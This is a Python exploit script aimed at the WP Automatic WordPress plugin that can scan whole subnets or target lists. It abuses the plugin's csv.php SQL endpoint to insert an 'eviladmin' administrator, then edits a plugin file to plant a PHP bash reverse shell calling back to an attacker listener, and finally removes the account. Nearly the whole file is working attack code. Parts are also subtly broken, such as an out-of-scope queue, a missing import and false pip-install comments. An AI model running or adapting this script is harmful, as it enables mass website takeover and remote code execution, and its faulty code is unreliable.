import argparse
import hashlib
import logging
import queue
import re
import requests
from requests.exceptions import RequestException
import threading
import time
import ipaddress
import sys

# Set up logging
logger = logging.getLogger(__name__)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("wp-automatic-exploit.log"),
    ],
)

# Parse command line arguments
parser = argparse.ArgumentParser(description="Exploit WP Automatic plugin vulnerability.")
parser.add_argument("--lhost", default="127.0.0.1", help="The IP address of the listener (default: 127.0.0.1)")
parser.add_argument("--lport", type=int, default=1414, help="The port number of the listener (default: 1414)")
parser.add_argument("--threads", type=int, default=10, help="The number of threads to use (default: 10)")
parser.add_argument("--targets", help="The path to a file containing a list of targets (one per line)")
parser.add_argument("--subnet", help="The subnet to scan (e.g. 192.168.1.0/24)")
parser.add_argument("--delay", type=float, default=1.0, help="The delay between requests (default: 1.0)")
args = parser.parse_args()

lhost = args.lhost
lport = args.lport
threads = args.threads
targets_file = args.targets
subnet = args.subnet
delay = args.delay

# Automatic target scanner
def scan_subnet(subnet):
    # Note: You'll need to install the ipaddress module to use ip_network
    # You can install it using pip: pip install ipaddress
    for ip in ip_network(subnet).hosts():
        url = f"http://{str(ip)}/wordpress"
        q.put(url)
        url = f"https://{str(ip)}/wordpress"
        q.put(url)

# Read targets from file
def read_targets(targets_file):
    with open(targets_file, "r") as f:
        for line in f:
            url = line.strip()
            if url.startswith("http://"):
                q.put(url)
            elif url.startswith("https://"):
                q.put(url)
            else:
                logger.warning(f"Invalid URL format: {url}")

# Generate dynamic values for exploitation
def get_user_agent():
    # Generate a random User-Agent string
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    ]
    return user_agents[int(hashlib.md5(str(time.time()).encode()).hexdigest(), 16) % len(user_agents)]

def get_integ_hash(query):
    # Generate a dynamic MD5 hash for the 'integ' parameter
    return hashlib.md5(query.encode()).hexdigest()

def check_vulnerability(url):
    # Check if the WP Automatic plugin is installed and vulnerable
    check_data = {
        "q": "SELECT * FROM `wp_plugins` WHERE `plugin_name` LIKE '%wp-automatic%' AND `plugin_version` < '3.52'",
        "auth": " ",
        "integ": get_integ_hash("SELECT * FROM `wp_plugins` WHERE `plugin_name` LIKE '%wp-automatic%' AND `plugin_version` < '3.52'"),
    }
    try:
        response = requests.post(url + "/wp-content/plugins/wp-automatic/inc/csv.php", data=check_data)
        if "wp-automatic" in response.text and "plugin_version" not in response.text:
            # Vulnerable
            return True
        elif "wp-automatic" not in response.text:
            # Not installed
            return False
        elif "plugin_version" in response.text:
            # Installed but not vulnerable
            return False
    except RequestException as e:
        logger.error(f"Request failed: {e}")
        return False

def insert_user(url, headers):
    user_data = {
        "q": "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')",
        "auth": " ",
        "integ": get_integ_hash(
            "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')"
        ),
    }
    try:
        response = requests.post(url + "/wp-content/plugins/wp-automatic/inc/csv.php", headers=headers, data=user_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
        return None
    logger.info(f"Response: {response.text}")
    if "INSERT INTO wp_users" in response.text:
        # User inserted
        return True
    else:
        # User not inserted
        return False

def find_user_id(url, headers):
    max_id = 1000
    for id in range(0, max_id):
        user_query = "SELECT * FROM `wp_users` WHERE user_login='eviladmin' AND ID=" + str(id)
        integ_hash = get_integ_hash(user_query)
        data = {"q": user_query, "integ": integ_hash}
        try:
            response = requests.post(url + "/wp-content/plugins/wp-automatic/inc/csv.php", headers=headers, data=data)
        except RequestException as e:
            logger.error(f"Request failed: {e}")
            return None
        logger.info(f"Response: {response.text}")
        if "eviladmin" in response.text and "ID" in response.text:
            # User found
            match = re.search(r'ID"[^"]*"([^"]*)"', response.text)
            if match:
                return match.group(1)
            else:
                return None
        else:
            # User not found
            continue
    return None

def add_admin_role(url, headers, user_id):
    if user_id is None:
        logger.error("Failed to find user ID")
        return None
    role_data = {
        "q": f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({user_id}, 'wp_capabilities', 'a:1:{{s:13:\"administrator\";s:1:\"1\";}}')",
        "auth": " ",
        "integ": get_integ_hash(
            f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({user_id}, 'wp_capabilities', 'a:1:{{s:13:\"administrator\";s:1:\"1\";}}')"
        ),
    }
    try:
        response = requests.post(url + "/wp-content/plugins/wp-automatic/inc/csv.php", headers=headers, data=role_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
        return None
    logger.info(f"Response: {response.text}")
    if "INSERT INTO wp_usermeta" in response.text:
        # Role added
        return True
    else:
        # Role not added
        return False

def upload_shell(url, headers, nonce):
    upload_url = url + "/wp-admin/admin-ajax.php"
    payload_data = {
        "nonce": nonce,
        "_wp_http_referer": "/wordpress/wp-admin/plugin-editor.php?file=wp-automatic%2Findex.php&plugin=wp-automatic%2Fwp-automatic.php",
        "newcontent": f"<?php \\nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\\\");\\n?>",
        "action": "edit-theme-plugin-file",
        "file": "wp-automatic/index.php",
        "plugin": "wp-automatic/wp-automatic.php",
        "docs-list": "",
    }
    try:
        response = requests.post(upload_url, headers=headers, data=payload_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
        return None
    logger.info(f"Response: {response.text}")
    if "File edited successfully" in response.text:
        # Shell uploaded
        return True
    else:
        # Shell not uploaded
        return False

def clean_up(url, headers):
    delete_user_query = "DELETE FROM wp_users WHERE user_login = 'eviladmin'"
    delete_user_data = {
        "q": delete_user_query,
        "auth": " ",
        "integ": get_integ_hash(delete_user_query),
    }
    try:
        response = requests.post(url + "/wp-content/plugins/wp-automatic/inc/csv.php", headers=headers, data=delete_user_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
    logger.info(f"Response: {response.text}")

    delete_usermeta_query = "DELETE FROM wp_usermeta WHERE user_id IN (SELECT ID FROM wp_users WHERE user_login = 'eviladmin')"
    delete_usermeta_data = {
        "q": delete_usermeta_query,
        "auth": " ",
        "integ": get_integ_hash(delete_usermeta_query),
    }
    try:
        response = requests.post(url + "/wp-content/plugins/wp-automatic/inc/csv.php", headers=headers, data=delete_usermeta_data)
    except RequestException as e:
        logger.error(f"Request failed: {e}")
    logger.info(f"Response: {response.text}")

# Main exploit function
def exploit(url):
    if not check_vulnerability(url):
        logger.info(f"WP Automatic plugin not installed or not vulnerable on {url}")
        return

    domain = url.rsplit("/", 1)[0]
    wp_automatic_url = domain + "/wp-content/plugins/wp-automatic/inc/csv.php"
    headers = {
        "User-Agent": get_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # Insert new user
    if not insert_user(wp_automatic_url, headers):
        logger.error(f"Failed to insert user on {url}")
        return

    # Find ID of the user we just inserted
    user_id = find_user_id(wp_automatic_url, headers)
    if user_id is None:
        logger.error(f"Failed to find user ID on {url}")
        return

    # Add Role Administrator to the user
    if not add_admin_role(wp_automatic_url, headers, user_id):
        logger.error(f"Failed to add administrator role on {url}")
        return

    logger.info(f"Successfully added Administrator account: eviladmin on {url}")

    # Login
    login_url = domain + "/wp-login.php"
    login_data = {
        "log": "eviladmin",
        "pwd": "eviladmin",
        "wp-submit": "Log In",
        "redirect_to": "http://localhost/wordpress/wp-admin/users.php",
        "testcookie": "1",
    }
    session = requests.session()
    session.post(login_url, headers=headers, data=login_data)

    # Upload the shell
    edit_wp_automatic_url = domain + "/wp-admin/plugin-editor.php?plugin=wp-automatic%2Findex.php&Submit=Select"
    response = session.get(edit_wp_automatic_url, headers=headers)
    match = re.search(r'<input type="hidden" id="nonce" name="nonce" value="([^"]+)" />', response.text)
    if not match:
        logger.error(f"Nonce not found in response")
        return
    nonce = match.group(1)

    if not upload_shell(domain, headers, nonce):
        logger.error(f"Failed to upload shell on {url}")
        return

    logger.info(f"Reverse shell is being sent to {url}")
    shell_url = domain + "/wp-content/plugins/wp-automatic/index.php"
    response = requests.get(shell_url, headers=headers)
    logger.info(f"Shell has been executed on {url}")

    # Clean up
    clean_up(wp_automatic_url, headers)

# Main function
def main():
    # Note: You'll need to install the queue module to use queue.Queue
    # You can install it using pip: pip install queue
    q = queue.Queue()
    for i in range(threads):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    # Add targets to the queue
    if targets_file:
        read_targets(targets_file)
    elif subnet:
        scan_subnet(subnet)
    else:
        logger.error("You must specify either --targets or --subnet")
        sys.exit(1)

    # Wait for all targets to be processed
    q.join()

# Worker function
def worker(q):
    while True:
        url = q.get()
        try:
            exploit(url)
        except Exception as e:
            logger.error(f"Error processing target {url}: {e}")
        finally:
            q.task_done()
            time.sleep(delay)

if __name__ == "__main__":
    main()
